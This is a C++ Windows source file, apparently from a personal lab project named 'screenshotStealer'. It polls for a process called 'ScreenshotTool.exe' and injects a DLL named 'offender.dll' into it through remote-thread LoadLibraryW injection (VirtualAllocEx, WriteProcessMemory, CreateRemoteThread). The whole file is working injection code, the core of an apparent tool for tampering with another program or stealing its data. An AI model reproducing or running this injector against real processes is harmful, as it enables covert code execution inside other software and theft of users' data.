#include <windows.h>
#include <tlhelp32.h>

#include <iostream>
#include <filesystem>

namespace fs = std::filesystem;

int tryfindProcess(const char* name) {
	HANDLE hSnapshot;
	PROCESSENTRY32 pe;
	int pid = 0;
	BOOL hResult;

	// snapshot of all processes in the system
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

	// initializing size: needed for using Process32First
	pe.dwSize = sizeof(PROCESSENTRY32);

	// info about first process encountered in a system snapshot
	hResult = Process32First(hSnapshot, &pe);

	// retrieve information about the processes
	// and exit if unsuccessful
	while (hResult) {
		// if we find the process: return process ID
		if (strcmp(name, pe.szExeFile) == 0) {
			pid = pe.th32ProcessID;
			break;
		}
		hResult = Process32Next(hSnapshot, &pe);
	}

	// closes an open handle (CreateToolhelp32Snapshot)
	CloseHandle(hSnapshot);
	return pid;
}

void injectDll(int pid, const wchar_t* dllPath, const size_t dllPathSize) {
	std::cout << "PWD: " << fs::current_path() << std::endl;
	std::cout << "Injecting DLL to PID: " << pid << std::endl;

	auto processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
	auto remoteBuffer = VirtualAllocEx(processHandle, NULL, dllPathSize, MEM_COMMIT, PAGE_READWRITE);
	
	if (remoteBuffer) {
		WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, dllPathSize, NULL);
		PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
		CreateRemoteThread(processHandle, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL);
		CloseHandle(processHandle);
	}
}

void mainloop(const wchar_t* dllPath, const size_t dllPathSize) {
	bool processFound{ false };

	while (true) {
		int pid = tryfindProcess("ScreenshotTool.exe");
		if (pid == 0) {
			processFound = false;
			continue;
		}

		if (processFound) {
			continue;
		}
		processFound = true;
		injectDll(pid, dllPath, dllPathSize);
		std::cout << pid << std::endl;
	}
}

int main() {
	wchar_t dllPath[] = TEXT(L"C:\\Users\\jerki\\Documents\\workspace\\codelabs\\screenshotStealer\\ScreenshotTool\\out\\build\\x64-debug\\offender\\offender.dll");

	mainloop(dllPath, sizeof(dllPath));

	return 0;
}